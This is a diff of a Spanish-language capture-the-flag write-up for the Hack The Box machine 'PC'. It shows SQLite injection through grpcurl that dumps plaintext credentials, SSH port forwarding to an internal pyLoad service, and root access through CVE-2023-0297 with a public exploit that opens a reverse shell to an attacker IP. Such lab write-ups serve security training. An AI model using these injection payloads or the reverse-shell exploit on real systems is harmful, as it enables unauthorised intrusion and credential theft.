@@ -317,35 +317,48 @@ Utilizaremos el servicio `SimpleApp` con el método `RegisterUser` y trataremos 
 
 <figure><img src="../../.gitbook/assets/imagen (428).png" alt="" width="431"><figcaption></figcaption></figure>
 
-En la respuesta por parte del servidor&#x20;
+En la respuesta por parte del servidor se nos muestra el mensaje indicando que la cuenta ha sido registrada correctamente, el mismo mensaje que se nos mostraba con `grpcurl`.
 
 <figure><img src="../../.gitbook/assets/imagen (429).png" alt="" width="339"><figcaption></figcaption></figure>
 
+Utilizaremos el método de `LoginUser` para iniciar sesión con el usuario recién creado, le daremos a `Invoke`nuevamente.
 
+<figure><img src="../../.gitbook/assets/imagen (430).png" alt="" width="418"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (430).png" alt=""><figcaption></figcaption></figure>
+En la respuesta por parte del servidor, se nos muestra la respuesta en la cual nos proporcionan nuestro `ID` y en el apartado de `Response Trailers` se nos proporciona el `Token` correspondiente a nuestro usuario.
 
+<figure><img src="../../.gitbook/assets/imagen (431).png" alt="" width="563"><figcaption></figcaption></figure>
 
+Por último, utilizaremos el método de `getInfo`para probar la funcionalidad de este método. Especificaremos nuestro `ID` y le añadiremos un nuevo valor `Token` en el apartado de `Request Metadata`.
 
-<figure><img src="../../.gitbook/assets/imagen (431).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (432).png" alt="" width="497"><figcaption></figcaption></figure>
 
-
-
-<figure><img src="../../.gitbook/assets/imagen (432).png" alt=""><figcaption></figcaption></figure>
-
-
+En la respuesta por parte del servidor, se nos muestra el mensaje de `Will update soon`, tal y como nos aparecía en la herramienta de `grpcurl`.
 
 <figure><img src="../../.gitbook/assets/imagen (433).png" alt=""><figcaption></figcaption></figure>
-
-
 
 ## Initial Access
 
 ### SQL Injection in SQLite trough grpcurl (Enumerating Tables, Columns and Data)
 
+Después de revisar los endpoints, vimos que no hay nada explotable a simple vista. Pero como el servicio maneja autenticación con usuarios, contraseñas e identificadores, es probable que haya una base de datos detrás. Esto nos abre la puerta a probar una posible inyección SQL (SQLi) si algún parámetro es vulnerable.
 
+Para comprobarlo, empezamos a jugar con el parámetro **id** en `getInfo`. Un truco básico para detectar SQLi es usar `OR 1=1`, que si funciona, suele devolver un resultado válido sin importar el ID.
+
+El mensaje de respuesta sugiere que la consulta se ejecutó sin error, lo que indica que podría haber SQLi en este punto.
+
+```bash
+❯ grpcurl -format text -d 'id: "435 OR 1=1"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
+message: "The admin is working hard to fix the issues."
+```
+
+Después de investigar los diferentes payloads para detectar la infraestructura de la base de datos, comprobamos que se trata de `SQLite`.
+
+A través de `PayloadsAllTheThings` realizaremos las inyecciones SQL típicas para lograr extraer los datos de las bases de datos presentes.
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" %}
+
+El primer paso a realizar, será lograr determinar el total de columnas que dispone le base de datos, para así lograr inyectar el payload. En este caso, se confirma que la base de datos solamente dispone de una columna con una versión de `SQLite 3.31.1`.
 
 ```bash
 ❯ grpcurl -format text -d 'id: "435 UNION SELECT 1;"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
@@ -355,90 +368,68 @@ message: "1"
 message: "3.31.1"
 ```
 
-
+A través de la siguiente inyección SQL, comprobamos las tablas presentes en la base de datos. En el resultado obtenido, verificamos la existencia de las tablas `accounts`y `messages`.
 
 ```bash
 ❯ grpcurl -format text -d "id: \"435 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';\"" -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
 message: "accounts,messages"
 ```
 
-
+Enumeraremos las columnas presentes en la tabla `accounts`, en la cual se nos muestran las columnas `username`y `password`.
 
 ```bash
 ❯ grpcurl -format text -d "id: \"435 UNION SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('accounts');\"" -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
 message: "username,password"
 ```
 
-
+Comprobaremos los datos de las columnas presentes en la tabla `accounts`. En el resultado obtenido, comprobamos que nos aparecen las credenciales del usuario `admin` y del usuario `sau`.
 
 ```bash
 ❯ grpcurl -format text -d 'id: "435 UNION SELECT GROUP_CONCAT(username || \":\" || password) FROM accounts;"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
 message: "admin:admin,sau:HereIsYourPassWord1431"
 ```
 
-
+Probaremos de conectarnos al equipo mediante `SSH`, una vez comprobado el acceso verificaremos la flag **user.txt**.
 
 ```bash
 ❯ sshpass -p HereIsYourPassWord1431 ssh sau@10.10.11.214
 Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
 sau@pc:~$ cat user.txt 
-bf851c74a19dd325d1b505280dbbed5a
+bf851c74a***********************
 ```
 
 ## Privilege Escalation
 
 ### Discover Ineternal Web Server (SSH Port Forwarding)
 
+En el equipo, después de una enumeración inicial básica comprobamos algunos puertos internos desconocidos, en el cual al realizar un `cURL` sobre ellos se nos mostraba una redirección a lo que parece ser a un panel de `login`.
 
-
-```bash
-sau@pc:~$ netstat -ano | grep LISTEN
+<pre class="language-bash"><code class="lang-bash">sau@pc:~$ netstat -ano | grep LISTEN
 tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)
 tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      off (0.00/0/0)
 tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
 tcp6       0      0 :::50051                :::*                    LISTEN      off (0.00/0/0)
-tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
-unix  2      [ ACC ]     SEQPACKET  LISTENING     23552    /run/udev/control
-unix  2      [ ACC ]     STREAM     LISTENING     43060    /run/user/1001/systemd/private
-unix  2      [ ACC ]     STREAM     LISTENING     43067    /run/user/1001/bus
-unix  2      [ ACC ]     STREAM     LISTENING     43068    /run/user/1001/gnupg/S.dirmngr
-unix  2      [ ACC ]     STREAM     LISTENING     43069    /run/user/1001/gnupg/S.gpg-agent.browser
-unix  2      [ ACC ]     STREAM     LISTENING     43070    /run/user/1001/gnupg/S.gpg-agent.extra
-unix  2      [ ACC ]     STREAM     LISTENING     23534    @/org/kernel/linux/storage/multipathd
-unix  2      [ ACC ]     STREAM     LISTENING     43071    /run/user/1001/gnupg/S.gpg-agent.ssh
-unix  2      [ ACC ]     STREAM     LISTENING     43072    /run/user/1001/gnupg/S.gpg-agent
-unix  2      [ ACC ]     STREAM     LISTENING     43073    /run/user/1001/pk-debconf-socket
-unix  2      [ ACC ]     STREAM     LISTENING     28227    /var/snap/lxd/common/lxd/unix.socket
-unix  2      [ ACC ]     STREAM     LISTENING     43074    /run/user/1001/snapd-session-agent.socket
-unix  2      [ ACC ]     STREAM     LISTENING     23521    /run/systemd/private
-unix  2      [ ACC ]     STREAM     LISTENING     23523    /run/systemd/userdb/io.systemd.DynamicUser
-unix  2      [ ACC ]     STREAM     LISTENING     23532    /run/lvm/lvmpolld.socket
-unix  2      [ ACC ]     STREAM     LISTENING     23537    /run/systemd/fsck.progress
-unix  2      [ ACC ]     STREAM     LISTENING     23547    /run/systemd/journal/stdout
-unix  2      [ ACC ]     STREAM     LISTENING     23831    /run/systemd/journal/io.systemd.journal
-unix  2      [ ACC ]     STREAM     LISTENING     28224    /run/dbus/system_bus_socket
-unix  2      [ ACC ]     STREAM     LISTENING     28106    /var/run/vmware/guestServicePipe
-unix  2      [ ACC ]     STREAM     LISTENING     28230    /run/snapd.socket
-unix  2      [ ACC ]     STREAM     LISTENING     28232    /run/snapd-snap.socket
-unix  2      [ ACC ]     STREAM     LISTENING     28234    /run/uuidd/request
-unix  2      [ ACC ]     STREAM     LISTENING     31745    /run/irqbalance//irqbalance805.sock
-unix  2      [ ACC ]     STREAM     LISTENING     28226    @ISCSIADM_ABSTRACT_NAMESPACE
+tcp6       0      0 :::22                   :::*                    LISTEN      off (0.
+
 sau@pc:~$ curl 127.0.0.1:8000
-<!doctype html>
-<html lang=en>
-<title>Redirecting...</title>
-<h1>Redirecting...</h1>
-<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
-sau@pc:~$ curl 127.0.0.1:9666
-<!doctype html>
-<html lang=en>
-<title>Redirecting...</title>
-<h1>Redirecting...</h1>
-<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F">/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F</a>. If not, click the link.
-```
+&#x3C;!doctype html>
+&#x3C;html lang=en>
+&#x3C;title>Redirecting...&#x3C;/title>
+&#x3C;h1>Redirecting...&#x3C;/h1>
+&#x3C;p>You should be redirected automatically to the target URL: &#x3C;a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&#x3C;/a>. If not, click the link.
+<strong>
+</strong><strong>sau@pc:~$ curl 127.0.0.1:9666
+</strong>&#x3C;!doctype html>
+&#x3C;html lang=en>
+&#x3C;title>Redirecting...&#x3C;/title>
+&#x3C;h1>Redirecting...&#x3C;/h1>
+&#x3C;p>You should be redirected automatically to the target URL: &#x3C;a href="/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F">/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F&#x3C;/a>. If not, click the link.
+</code></pre>
 
+Después de identificar los puertos `8000` y `9666` corriendo en `localhost`, establecemos un `port forwarding` con SSH para exponerlos en nuestra máquina.
 
+Esto nos permite acceder a los servicios en [http://127.0.0.1:8000](http://127.0.0.1:8000) y [http://127.0.0.1:9666](http://127.0.0.1:9666) desde nuestro navegador, como si estuvieran corriendo en nuestra máquina local. Ahora podemos interactuar con ellos y buscar posibles vulnerabilidades.
 
 ```bash
 ❯ sshpass -p HereIsYourPassWord1431 ssh -L 8000:127.0.0.1:8000 -L 9666:127.0.0.1:9666 sau@10.10.11.214
@@ -446,25 +437,35 @@ Last login: Thu Feb 20 03:36:26 2025 from 10.10.16.3
 sau@pc:~$ 
 ```
 
+Accederemos a [http://localhost:8000](http://localhost:8000) y comprobaremos que se trata de una página de inicio de sesión de `pyLoad`.
 
-
-
+{% hint style="info" %}
+pyLoad es un gestor de descargas rápido, ligero y completo para muchos formatos de contenedores One-Click-Hoster como DLC, sitios de vídeo o simplemente enlaces http/ftp . Su objetivo es que los requisitos de hardware sean bajos y que la plataforma sea independiente para que pueda ejecutarse en todo tipo de sistemas (computadora de escritorio, netbook, NAS, enrutador).
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/5174_vmware_7198sIDIMU.png" alt=""><figcaption></figcaption></figure>
 
+A través de una búsqueda por Internet, comprobaremos las credenciales que se utilizan por defecto en `pyLoad`.
+
+<figure><img src="../../.gitbook/assets/imagen (434).png" alt=""><figcaption></figcaption></figure>
+
+Al tratar de iniciar sesión las credenciales `pyload/pyload` se nos mostraba un mensaje de error indicando que las credenciales proporcionadas no eran válidas.
+
+<figure><img src="../../.gitbook/assets/imagen (435).png" alt="" width="512"><figcaption></figcaption></figure>
+
 ### pyLoad 0.5.0 Exploitation - Prea-auth Remote Code Execution \[RCE] (CVE-2023-0297)
 
+Volvemos al equipo víctima y verificaremos quién es el usuario que está ejecutando el `pyLoad`, en este caso se verifica que es el usuario `root`. Por otro lado, también logramos comprobar la versión exacta del servicio de `pyLoad`.
 
-
-```bash
-sau@pc:~$ ps aux | grep pyload
+<pre class="language-bash"><code class="lang-bash">sau@pc:~$ ps aux | grep pyload
 root        1045  0.0  1.6 1217800 65964 ?       Ssl  02:20   0:03 /usr/bin/python3 /usr/local/bin/pyload
 sau         1881  0.0  0.0   8160  2396 pts/0    S+   03:39   0:00 grep --color=auto pyload
-sau@pc:~$ /usr/local/bin/pyload --version
-pyLoad 0.5.0
-```
+<strong>
+</strong><strong>sau@pc:~$ /usr/local/bin/pyload --version
+</strong>pyLoad 0.5.0
+</code></pre>
 
-
+Realizaremos una búsqueda con `searchsploit` para verificar si existe alguna vulnerabilidad conocida para `pyLoad`. En el resultado que hemos obtenido, comprobamos que existe una vulnerabilidad de `Pre-auth RCE` para la versión exacta que está levantado en el sistema víctima, con lo cual podríamos intentar explotar dicha vulnerabilidad reportada como `CVE-2023-0297`.
 
 ```bash
 ❯ searchsploit pyLoad
@@ -476,7 +477,15 @@ PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)                             
 Shellcodes: No Results
 ```
 
+{% embed url="https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-0297" %}
 
+{% hint style="danger" %}
+Inyección de código en el repositorio de GitHub pyload/pyload anterior a 0.5.0b3.dev31.
+{% endhint %}
+
+Realizando una búsqueda por Internet, nos encontramos con el siguiente repositorio de GitHub en el cual nos proporcionan un exploit para aprovecharnos de la vulnerabilidad.
+
+{% embed url="https://github.com/JacobEbben/CVE-2023-0297" %}
 
 ```bash
 ❯ git clone https://github.com/JacobEbben/CVE-2023-0297; cd CVE-2023-0297
@@ -489,21 +498,23 @@ Recibiendo objetos: 100% (10/10), 4.13 KiB | 1.38 MiB/s, listo.
 Resolviendo deltas: 100% (2/2), listo.
 ```
 
-
+Nos pondremos en escucha con `nc`para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Realizaremos la ejecución del exploit sobre la URL vulnerable donde está el `pyLoad`, en este caso, utilizaremos [http://localhost:8000](http://localhost:8000) debido que hemos aplicado `Port-Forwarding` e indicaremos nuestra dirección y puerto de atacante donde recibiremos la Reverse Shell.
 
 ```bash
 ❯ python3 exploit.py -t http://localhost:8000 -I 10.10.16.3 -P 443
 [SUCCESS] Running reverse shell. Check your listener!
 ```
 
+Comprobaremos que hemos recibido la conexión al equipo victima y nos encontramos como `root` debido que el usuario que levantaba el servicio de `pyLoad` era él, por lo tanto, los comandos inyectados se ejecutarán como dicho usuario.&#x20;
 
+Finalmente logramos obtener la flag **root.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -513,24 +524,26 @@ bash: cannot set terminal process group (1045): Inappropriate ioctl for device
 bash: no job control in this shell
 root@pc:~/.pyload/data# cat /root/root.txt
 cat /root/root.txt
-f12c72922dc295ddf5220953e296fc59
+f12c72922d************************
 ```
-
-
-
-
 
 ### Analyzing how works payload
 
+Analizaremos el exploit para verificar cómo funciona por detrás. Para ello, a través de la variable de entorno `HTTP_PROXY` indicaremos la dirección IP de nuestro `localhost` por el puerto `8080`que es donde tenemos configurado `BurpSuite`.
 
+Una vez indicado el proxy, ejecutaremos el exploit para que por ejemplo ejecute el comando `whoami`.
 
 ```bash
 ❯ HTTP_PROXY=http://127.0.0.1:8080 python3 exploit.py -t http://localhost:8000 -c 'whoami > /tmp/whoami'
 [SUCCESS] Running your command: "whoami > /tmp/whoami"!
 ```
 
+En la solicitud que se intercepta a través de `BurpSuite`, se verifica que para aprovecharnos de la vulnerabilidad se realiza una solicitud por el método `POST` al endpoint `/flash/addcrypted2`.
+
+Posteriormente, se importa a realizar la importación de la librería `os` y se realiza la ejecución del payload, posteriormente se declaran funciones y variables necesarias para la explotación de la vulnerabilidad.
+
 <figure><img src="../../.gitbook/assets/imagen (425).png" alt=""><figcaption></figcaption></figure>
 
-
+En este ejemplo, verificamos el funcionamiento de la vulnerabilidad a través de la solicitud por `POST` que tramitamos a través de `BurpSuite`.
 
 <figure><img src="../../.gitbook/assets/5177_vmware_r7HrtyzDIO.png" alt=""><figcaption></figcaption></figure>
